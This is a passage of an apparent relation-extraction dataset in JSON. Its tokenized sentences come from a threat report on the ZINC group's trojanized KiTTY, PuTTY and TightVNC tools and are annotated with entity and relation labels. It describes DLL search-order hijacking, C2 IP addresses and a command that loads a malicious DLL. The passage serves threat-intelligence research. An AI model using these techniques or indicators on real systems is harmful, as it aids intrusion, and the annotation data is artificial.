"sents": [["It", "then", "sends", "that", "information", "to", "a", "hardcoded", "IP", "172.93.201.253", "over", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "then", "deploys", "the", "malware", "as", "%", "AppData", "%", "\\mscoree.dll", "following", "multiple", "rounds", "of", "decoding", "."], ["The", "mscoree.dll", "file", "is", "the", "embedded", "payload", ",", "detected", "as", "EventHorizon", ",", "in", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'", "s", "version", "of", "PuTTY", ",", "the", "actor", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "that", "perform", "tasks", "within", "the", "context", "of", "these", "legitimate", "Windows", "processes", ",", "specifically", "through", "%", "AppData", "%", "KiTTY", "%", "PresentationHost.exe", "-EmbeddingObject", "."], ["Screenshot", "of", "Windows", "process", "that", "ZINC", "hijacks", "through", "DLL", "search", "order", "hijacking"], ["The", "mscoree.dll", "malware", "is", "modularized", "in", "such", "a", "way", "that", ",", "upon", "successful", "connection", "to", "the", "compromised", "C2", "domain", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "target", "system", "as", "needed", "using", "the", "existing", "C2", "communication", ",", "such", "as", "executing", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["The", "HTTP", "POST", "requests", "contain", "the", "hardcoded", "user", "agent", "string", "with", "misspelled", "``", "Edge", "''", ",", "as", "detailed", "below", ",", "and", "contain", "a", "unique", "ID", "for", "the", "field", "gametype", "and", "the", "hardcoded", "value", "for", "the", "field", "type", "for", "malware", "campaign", "tracking", "purposes", ":"], ["This", "malware", "has", "a", "unique", "PDBPath", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "172.93.201.253", "pos": [9, 10], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [37, 37], "name": "137.184.15.189", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [41, 41], "name": "KiTTY executable", "pos": [12, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [48, 48], "name": "% AppData % \\mscoree.dll", "pos": [19, 23], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [59, 59], "name": "mscoree.dll", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [68, 68], "name": "EventHorizon", "pos": [10, 11], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [78, 78], "name": "ZINC", "pos": [2, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [83, 83], "name": "PuTTY", "pos": [7, 8], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [88, 88], "name": "DLL search order hijacking", "pos": [12, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [95, 95], "name": "DLL files", "pos": [19, 21], "index": "10_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [106, 106], "name": "Windows processes", "pos": [30, 32], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [111, 111], "name": "% AppData % KiTTY % PresentationHost.exe", "pos": [35, 41], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [121, 121], "name": "Windows process", "pos": [2, 4], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [124, 124], "name": "ZINC", "pos": [5, 6], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [132, 132], "name": "mscoree.dll malware", "pos": [1, 3], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [148, 148], "name": "C2 domain", "pos": [17, 19], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [152, 152], "name": "attackers", "pos": [21, 22], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [156, 156], "name": "malware", "pos": [25, 26], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [172, 172], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [41, 44], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [180, 180], "name": "mapistub.dll", "pos": [49, 50], "index": "20_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [184, 184], "name": "C2 server", "pos": [53, 55], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [188, 188], "name": "HTTP POST requests", "pos": [1, 4], "index": "22_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [214, 214], "name": "field gametype", "pos": [27, 29], "index": "23_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [218, 218], "name": "hardcoded value", "pos": [31, 33], "index": "24_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [235, 235], "name": "PDBPath", "pos": [5, 6], "index": "25_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [1], "t": 2, "h": 3}, {"r": "RF", "evidence": [1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2], "t": 5, "h": 6}, {"r": "FR", "evidence": [2, 3], "h": 6, "t": 11}, {"r": "CO", "evidence": [1, 2], "t": 4, "h": 5}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [2, 3], "t": 5, "h": 7}, {"r": "WR", "evidence": [2, 3], "t": 5, "h": 8}, {"r": "EX", "evidence": [3], "t": 10, "h": 11}, {"r": "EX", "evidence": [3], "h": 11, "t": 12}, {"r": "RD", "evidence": [3, 4], "t": 12, "h": 13}, {"r": "ST", "evidence": [4, 5], "h": 13, "t": 16}, {"r": "RF", "evidence": [4, 5], "h": 13, "t": 16}, {"r": "RD", "evidence": [3, 4], "t": 12, "h": 14}, {"r": "ST", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "RF", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "ST", "evidence": [5], "h": 15, "t": 16}, {"r": "RF", "evidence": [5], "h": 15, "t": 16}, {"r": "FR", "evidence": [5], "h": 17, "t": 18}, {"r": "EX", "evidence": [5], "h": 18, "t": 19}, {"r": "RD", "evidence": [5], "h": 18, "t": 20}, {"r": "RF", "evidence": [5], "h": 18, "t": 21}, {"r": "WR", "evidence": [5, 6], "h": 18, "t": 22}]}, {"title": "052-17", "sents": [["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "then", "deploys", "the", "malware", "as", "%", "AppData", "%", "\\mscoree.dll", "following", "multiple", "rounds", "of", "decoding", "."], ["The", "mscoree.dll", "file", "is", "the", "embedded", "payload", ",", "detected", "as", "EventHorizon", ",", "in", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'", "s", "version", "of", "PuTTY", ",", "the", "actor", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "that", "perform", "tasks", "within", "the", "context", "of", "these", "legitimate", "Windows", "processes", ",", "specifically", "through", "%", "AppData", "%", "KiTTY", "%", "PresentationHost.exe", "-EmbeddingObject", "."], ["Screenshot", "of", "Windows", "process", "that", "ZINC", "hijacks", "through", "DLL", "search", "order", "hijacking"], ["The", "mscoree.dll", "malware", "is", "modularized", "in", "such", "a", "way", "that", ",", "upon", "successful", "connection", "to", "the", "compromised", "C2", "domain", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "target", "system", "as", "needed", "using", "the", "existing", "C2", "communication", ",", "such", "as", "executing", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["The", "HTTP", "POST", "requests", "contain", "the", "hardcoded", "user", "agent", "string", "with", "misspelled", "``", "Edge", "''", ",", "as", "detailed", "below", ",", "and", "contain", "a", "unique", "ID", "for", "the", "field", "gametype", "and", "the", "hardcoded", "value", "for", "the", "field", "type", "for", "malware", "campaign", "tracking", "purposes", ":"], ["This", "malware", "has", "a", "unique", "PDBPath", ":"], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [8, 8], "name": "137.184.15.189", "pos": [8, 9], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "KiTTY executable", "pos": [12, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": "% AppData % \\mscoree.dll", "pos": [19, 23], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "mscoree.dll", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "EventHorizon", "pos": [10, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [49, 49], "name": "ZINC", "pos": [2, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [54, 54], "name": "PuTTY", "pos": [7, 8], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [59, 59], "name": "DLL search order hijacking", "pos": [12, 16], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [66, 66], "name": "DLL files", "pos": [19, 21], "index": "8_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [77, 77], "name": "Windows processes", "pos": [30, 32], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [82, 82], "name": "% AppData % KiTTY % PresentationHost.exe", "pos": [35, 41], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [92, 92], "name": "Windows process", "pos": [2, 4], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [95, 95], "name": "ZINC", "pos": [5, 6], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [103, 103], "name": "mscoree.dll malware", "pos": [1, 3], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [119, 119], "name": "C2 domain", "pos": [17, 19], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [123, 123], "name": "attackers", "pos": [21, 22], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [127, 127], "name": "malware", "pos": [25, 26], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [143, 143], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [41, 44], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [151, 151], "name": "mapistub.dll", "pos": [49, 50], "index": "18_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [155, 155], "name": "C2 server", "pos": [53, 55], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [159, 159], "name": "HTTP POST requests", "pos": [1, 4], "index": "20_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [185, 185], "name": "field gametype", "pos": [27, 29], "index": "21_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [189, 189], "name": "hardcoded value", "pos": [31, 33], "index": "22_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [206, 206], "name": "PDBPath", "pos": [5, 6], "index": "23_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [217, 217], "name": "ReadMe.txt", "pos": [9, 10], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [220, 220], "name": "executable file", "pos": [12, 14], "index": "25_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1], "t": 3, "h": 4}, {"r": "FR", "evidence": [1, 2], "h": 4, "t": 9}, {"r": "CO", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 5}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 6}, {"r": "EX", "evidence": [2], "t": 8, "h": 9}, {"r": "EX", "evidence": [2], "h": 9, "t": 10}, {"r": "RD", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "ST", "evidence": [3, 4], "h": 11, "t": 14}, {"r": "RF", "evidence": [3, 4], "h": 11, "t": 14}, {"r": "RD", "evidence": [2, 3], "t": 10, "h": 12}, {"r": "ST", "evidence": [3, 4], "h": 12, "t": 14}, {"r": "RF", "evidence": [3, 4], "h": 12, "t": 14}, {"r": "ST", "evidence": [4], "h": 13, "t": 14}, {"r": "RF", "evidence": [4], "h": 13, "t": 14}, {"r": "FR", "evidence": [4], "h": 15, "t": 16}, {"r": "EX", "evidence": [4], "h": 16, "t": 17}, {"r": "RD", "evidence": [4], "h": 16, "t": 18}, {"r": "RF", "evidence": [4], "h": 16, "t": 19}, {"r": "WR", "evidence": [4, 5], "h": 16, "t": 20}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 16, "t": 25}]}, {"title": "052-18", "sents": [["The", "mscoree.dll", "file", "is", "the", "embedded", "payload", ",", "detected", "as", "EventHorizon", ",", "in", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'", "s", "version", "of", "PuTTY", ",", "the", "actor", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "that", "perform", "tasks", "within", "the", "context", "of", "these", "legitimate", "Windows", "processes", ",", "specifically", "through", "%", "AppData", "%", "KiTTY", "%", "PresentationHost.exe", "-EmbeddingObject", "."], ["Screenshot", "of", "Windows", "process", "that", "ZINC", "hijacks", "through", "DLL", "search", "order", "hijacking"], ["The", "mscoree.dll", "malware", "is", "modularized", "in", "such", "a", "way", "that", ",", "upon", "successful", "connection", "to", "the", "compromised", "C2", "domain", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "target", "system", "as", "needed", "using", "the", "existing", "C2", "communication", ",", "such", "as", "executing", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["The", "HTTP", "POST", "requests", "contain", "the", "hardcoded", "user", "agent", "string", "with", "misspelled", "``", "Edge", "''", ",", "as", "detailed", "below", ",", "and", "contain", "a", "unique", "ID", "for", "the", "field", "gametype", "and", "the", "hardcoded", "value", "for", "the", "field", "type", "for", "malware", "campaign", "tracking", "purposes", ":"], ["This", "malware", "has", "a", "unique", "PDBPath", ":"], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["The", ".txt", "file", "has", "the", "following", "content", ":"]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "mscoree.dll", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "EventHorizon", "pos": [10, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "ZINC", "pos": [2, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "PuTTY", "pos": [7, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "DLL search order hijacking", "pos": [12, 16], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "DLL files", "pos": [19, 21], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [48, 48], "name": "Windows processes", "pos": [30, 32], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [53, 53], "name": "% AppData % KiTTY % PresentationHost.exe", "pos": [35, 41], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [63, 63], "name": "Windows process", "pos": [2, 4], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [66, 66], "name": "ZINC", "pos": [5, 6], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [74, 74], "name": "mscoree.dll malware", "pos": [1, 3], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [90, 90], "name": "C2 domain", "pos": [17, 19], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [94, 94], "name": "attackers", "pos": [21, 22], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [98, 98], "name": "malware", "pos": [25, 26], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [114, 114], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [41, 44], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [122, 122], "name": "mapistub.dll", "pos": [49, 50], "index": "15_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [126, 126], "name": "C2 server", "pos": [53, 55], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [130, 130], "name": "HTTP POST requests", "pos": [1, 4], "index": "17_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [156, 156], "name": "field gametype", "pos": [27, 29], "index": "18_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [160, 160], "name": "hardcoded value", "pos": [31, 33], "index": "19_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [177, 177], "name": "PDBPath", "pos": [5, 6], "index": "20_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [188, 188], "name": "ReadMe.txt", "pos": [9, 10], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [191, 191], "name": "executable file", "pos": [12, 14], "index": "22_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [197, 197], "name": ".txt file", "pos": [1, 3], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0, 1], "h": 1, "t": 6}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 2}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "EX", "evidence": [1], "t": 5, "h": 6}, {"r": "EX", "evidence": [1], "h": 6, "t": 7}, {"r": "RD", "evidence": [1, 2], "t": 7, "h": 8}, {"r": "ST", "evidence": [2, 3], "h": 8, "t": 11}, {"r": "RF", "evidence": [2, 3], "h": 8, "t": 11}, {"r": "RD", "evidence": [1, 2], "t": 7, "h": 9}, {"r": "ST", "evidence": [2, 3], "h": 9, "t": 11}, {"r": "RF", "evidence": [2, 3], "h": 9, "t": 11}, {"r": "ST", "evidence": [3], "h": 10, "t": 11}, {"r": "RF", "evidence": [3], "h": 10, "t": 11}, {"r": "FR", "evidence": [3], "h": 12, "t": 13}, {"r": "EX", "evidence": [3], "h": 13, "t": 14}, {"r": "RD", "evidence": [3], "h": 13, "t": 15}, {"r": "RF", "evidence": [3], "h": 13, "t": 16}, {"r": "WR", "evidence": [3, 4], "h": 13, "t": 17}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 13, "t": 22}]}, {"title": "052-19", "sents": [["Similar", "to", "ZINC", "'", "s", "version", "of", "PuTTY", ",", "the", "actor", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "that", "perform", "tasks", "within", "the", "context", "of", "these", "legitimate", "Windows", "processes", ",", "specifically", "through", "%", "AppData", "%", "KiTTY", "%", "PresentationHost.exe", "-EmbeddingObject", "."], ["Screenshot", "of", "Windows", "process", "that", "ZINC", "hijacks", "through", "DLL", "search", "order", "hijacking"], ["The", "mscoree.dll", "malware", "is", "modularized", "in", "such", "a", "way", "that", ",", "upon", "successful", "connection", "to", "the", "compromised", "C2", "domain", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "target", "system", "as", "needed", "using", "the", "existing", "C2", "communication", ",", "such", "as", "executing", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["The", "HTTP", "POST", "requests", "contain", "the", "hardcoded", "user", "agent", "string", "with", "misspelled", "``", "Edge", "''", ",", "as", "detailed", "below", ",", "and", "contain", "a", "unique", "ID", "for", "the", "field", "gametype", "and", "the", "hardcoded", "value", "for", "the", "field", "type", "for", "malware", "campaign", "tracking", "purposes", ":"], ["This", "malware", "has", "a", "unique", "PDBPath", ":"], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["The", ".txt", "file", "has", "the", "following", "content", ":"], ["As", "part", "of", "the", "threat", "actor", "'", "s", "latest", "malware", "technique", "to", "evade", "traditional", "defenses", ",", "the", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", ",", "and", "it", "'", "s", "configured", "to", "install", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "in", "the", "TightVNC", "Viewer", ",", "as", "shown", "in", "Figure", "5", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "ZINC", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "PuTTY", "pos": [7, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "DLL search order hijacking", "pos": [12, 16], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": "DLL files", "pos": [19, 21], "index": "3_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [30, 30], "name": "Windows processes", "pos": [30, 32], "index": "4_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [35, 35], "name": "% AppData % KiTTY % PresentationHost.exe", "pos": [35, 41], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "Windows process", "pos": [2, 4], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [48, 48], "name": "ZINC", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "mscoree.dll malware", "pos": [1, 3], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [72, 72], "name": "C2 domain", "pos": [17, 19], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [76, 76], "name": "attackers", "pos": [21, 22], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [80, 80], "name": "malware", "pos": [25, 26], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [96, 96], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [41, 44], "index": "12_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [104, 104], "name": "mapistub.dll", "pos": [49, 50], "index": "13_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [108, 108], "name": "C2 server", "pos": [53, 55], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [112, 112], "name": "HTTP POST requests", "pos": [1, 4], "index": "15_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [138, 138], "name": "field gametype", "pos": [27, 29], "index": "16_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [142, 142], "name": "hardcoded value", "pos": [31, 33], "index": "17_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [159, 159], "name": "PDBPath", "pos": [5, 6], "index": "18_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [170, 170], "name": "ReadMe.txt", "pos": [9, 10], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [173, 173], "name": "executable file", "pos": [12, 14], "index": "20_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [179, 179], "name": ".txt file", "pos": [1, 3], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [204, 204], "name": "TightVNC Viewer", "pos": [18, 20], "index": "22_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [211, 211], "name": "remote hosts", "pos": [25, 27], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [222, 222], "name": "backdoor", "pos": [36, 37], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [228, 228], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [42, 43], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [235, 235], "name": "TightVNC Viewer", "pos": [49, 51], "index": "26_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "EX", "evidence": [0], "t": 3, "h": 4}, {"r": "EX", "evidence": [0], "h": 4, "t": 5}, {"r": "RD", "evidence": [0, 1], "t": 5, "h": 6}, {"r": "ST", "evidence": [1, 2], "h": 6, "t": 9}, {"r": "RF", "evidence": [1, 2], "h": 6, "t": 9}, {"r": "RD", "evidence": [0, 1], "t": 5, "h": 7}, {"r": "ST", "evidence": [1, 2], "h": 7, "t": 9}, {"r": "RF", "evidence": [1, 2], "h": 7, "t": 9}, {"r": "ST", "evidence": [2], "h": 8, "t": 9}, {"r": "RF", "evidence": [2], "h": 8, "t": 9}, {"r": "FR", "evidence": [2], "h": 10, "t": 11}, {"r": "EX", "evidence": [2], "h": 11, "t": 12}, {"r": "RD", "evidence": [2], "h": 11, "t": 13}, {"r": "RF", "evidence": [2], "h": 11, "t": 14}, {"r": "WR", "evidence": [2, 3], "h": 11, "t": 15}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 11, "t": 20}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "t": 15, "h": 22}, {"r": "WR", "evidence": [5, 6, 7], "t": 20, "h": 22}, {"r": "ST", "evidence": [7], "h": 22, "t": 23}, {"r": "RF", "evidence": [7], "h": 22, "t": 23}, {"r": "FR", "evidence": [7], "h": 22, "t": 24}, {"r": "ST", "evidence": [7], "t": 23, "h": 24}, {"r": "RF", "evidence": [7], "t": 23, "h": 24}, {"r": "WR", "evidence": [7], "h": 24, "t": 25}, {"r": "WR", "evidence": [7], "t": 25, "h": 26}, {"r": "WR", "evidence": [7], "t": 25, "h": 26}]}, {"title": "052-20", "sents": [["Screenshot", "of", "Windows", "process", "that", "ZINC", "hijacks", "through", "DLL", "search", "order", "hijacking"], ["The", "mscoree.dll", "malware", "is", "modularized", "in", "such", "a", "way", "that", ",", "upon", "successful", "connection", "to", "the", "compromised", "C2", "domain", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "target", "system", "as", "needed", "using", "the", "existing", "C2", "communication", ",", "such", "as", "executing", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["The", "HTTP", "POST", "requests", "contain", "the", "hardcoded", "user", "agent", "string", "with", "misspelled", "``", "Edge", "''", ",", "as", "detailed", "below", ",", "and", "contain", "a", "unique", "ID", "for", "the", "field", "gametype", "and", "the", "hardcoded", "value", "for", "the", "field", "type", "for", "malware", "campaign", "tracking", "purposes", ":"], ["This", "malware", "has", "a", "unique", "PDBPath", ":"], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["The", ".txt", "file", "has", "the", "following", "content", ":"], ["As", "part", "of", "the", "threat", "actor", "'", "s", "latest", "malware", "technique", "to", "evade", "traditional", "defenses", ",", "the", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", ",", "and", "it", "'", "s", "configured", "to", "install", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "in", "the", "TightVNC", "Viewer", ",", "as", "shown", "in", "Figure", "5", ":"], ["The", "malware", "was", "configured", "to", "send", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establish", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "Windows process", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "ZINC", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [13, 13], "name": "mscoree.dll malware", "pos": [1, 3], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [29, 29], "name": "C2 domain", "pos": [17, 19], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "attackers", "pos": [21, 22], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [37, 37], "name": "malware", "pos": [25, 26], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [53, 53], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [41, 44], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [61, 61], "name": "mapistub.dll", "pos": [49, 50], "index": "7_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [65, 65], "name": "C2 server", "pos": [53, 55], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [69, 69], "name": "HTTP POST requests", "pos": [1, 4], "index": "9_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [95, 95], "name": "field gametype", "pos": 